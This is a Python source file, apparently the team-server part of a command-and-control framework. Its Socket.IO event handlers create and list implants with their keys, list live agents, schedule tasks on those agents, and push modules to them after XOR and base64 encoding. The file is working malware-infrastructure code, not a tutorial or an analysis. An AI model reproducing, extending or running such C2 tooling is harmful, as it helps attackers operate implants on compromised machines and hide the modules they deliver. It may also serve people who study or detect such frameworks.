import hashlib
import json
import os

from connect.convert import string_to_base64, xor_base64
from connect.server.models import AgentModel, db, ImplantModel, TaskModel
from functools import wraps
from flask_socketio import disconnect


class TeamServerEvents:

    def __init__(self, key, team_server_sio):
        self.key = key
        self.team_server_sio = team_server_sio
        self.team_server_sio.on_event('agent', self.agent)
        self.team_server_sio.on_event('connect', self.connect)
        self.team_server_sio.on_event('implant', self.implant)
        self.team_server_sio.on_event('task', self.task)

    def connect(self, auth: str == ''):
        if auth != self.key:
            disconnect()

    # JSON event handler decorator
    def json_event_handler(handler_function):
        @wraps(handler_function)
        def decorated_handler(self, *args):
            if not args:
                self.team_server_sio.emit('error', f'No data provided to {handler_function.__name__}.')
                return
            try:
                deserialized_json = json.loads(args[0])
            except json.JSONDecodeError:
                self.team_server_sio.emit('error', f'Invalid JSON provided to {handler_function.__name__} event: {args[0]}')
                return
            return handler_function(self, deserialized_json)

        return decorated_handler

    @json_event_handler
    def agent(self, data):
        list_agent = data.get('list', None)
        if list_agent:
            seconds = int(list_agent.get('seconds'))
            agents = [agent.get_agent() for agent in AgentModel.query.all() if 0 <= agent.get_delta_seconds() <= seconds]
            if not agents:
                self.team_server_sio.emit('information', 'There are no agents.')
                return
            table = self.create_table('AGENTS', agents[0].keys(), agents)
            self.team_server_sio.emit('default', table)
            return
        self.team_server_sio.emit('information', f'Agent event hit with the following data: {data}')

    # Event handler for implant actions
    @json_event_handler
    def implant(self, data):
        create_implant = 'create' in data.keys()
        list_implant = 'list' in data.keys()
        if create_implant:
            new_implant = ImplantModel()
            self.commit(new_implant)
            self.team_server_sio.emit('success', f'Implant `{new_implant.id}` created their key is: `{new_implant.key}`')
            return
        if list_implant:
            implants = [implant.get_implant() for implant in ImplantModel.query.all()]
            if not implants:
                self.team_server_sio.emit('information', 'There are no implants.')
                return
            table = self.create_table('IMPLANTS', implants[0].keys(), implants)
            self.team_server_sio.emit('default', table)
            return
        self.team_server_sio.emit('information', f'Implant event hit with the following data: {data}')

    # Event handler for task actions
    @json_event_handler
    def task(self, data):
        create_task = data.get('create', None)
        if create_task:
            agent = AgentModel.query.filter_by(id=create_task['agent']).first() # ToDo: Error handling on agents that don't exists
            if not agent:
                self.team_server_sio.emit('error', f'Agent `{create_task["agent"]}` does not exist.')
                return
            parameters = ','.join(parameter for parameter in create_task.get('parameters', [])) # ToDo: If parameters are provided that are not a list then break
            misc = ','.join(parameter for parameter in create_task.get('misc', [])) # ToDo: If misc is provided that are not a list then break
            module = create_task.get('module', None)
            if not self.load_module(agent, module):
                return
            new_task = TaskModel(agent=agent, method=create_task['method'], type=create_task['type'],
                                 parameters=parameters, misc=misc)
            self.commit(new_task)
            self.team_server_sio.emit('success', f'Scheduled task for method: `{new_task.method}`')
            return
        self.team_server_sio.emit('information', f'Task event hit with the following data: {data}')

    def load_module(self, agent, module):
        if not module:
            return True
        if not os.path.exists(module):
            self.team_server_sio.emit('error', f'Module {module} does not exist.')
            return False
        module_bytes = open(module, 'rb').read()
        module_md5 = hashlib.md5(module_bytes).hexdigest()
        if module_md5 in agent.loaded_modules:
            return True
        module, key = xor_base64(module_bytes)
        parameters = ','.join([string_to_base64(module), string_to_base64(key)])
        new_task = TaskModel(agent=agent, method='load', type=0, parameters=parameters, misc='')
        self.commit(new_task)
        self.team_server_sio.emit('success', f'Scheduled task for method: `{new_task.method}`')
        agent.loaded_modules = module_md5 if not agent.loaded_modules else ','.join(
            agent.loaded_modules) + f',{module_md5}'
        self.commit(agent)
        return True

    # Database utility function
    @staticmethod
    def commit(model):
        db.session.add(model)
        db.session.commit()

    # Calculate the length of the longest value in a list of dictionaries
    @staticmethod
    def longest_value(items: list[dict]):
        return max(len(value) for item in items for value in item.values())

    # Generate a formatted table output
    @staticmethod
    def create_table(title, columns: list, items: list[dict]) -> str:
        # Calculate the maximum width for each column
        col_widths = [len(col) for col in columns]
        for item in items:
            for idx, col in enumerate(columns):
                col_widths[idx] = max(col_widths[idx], len(str(item.get(col, ''))) + 4)

        # Create the table header
        header = f"{title:^{sum(col_widths) + len(columns) - 1}}\n"
        header += ' '.join([f"{col:^{width}}" for col, width in zip(columns, col_widths)]) + '\n'
        header += ' '.join(['-' * width for width in col_widths]) + '\n'

        # Create the table rows
        rows = []
        for item in items:
            row = ' '.join([f"{str(item.get(col, '')):^{width}}" for col, width in zip(columns, col_widths)]) + '\n'
            rows.append(row)

        # Combine header and rows to form the table
        table = header + ''.join(rows)
        return table
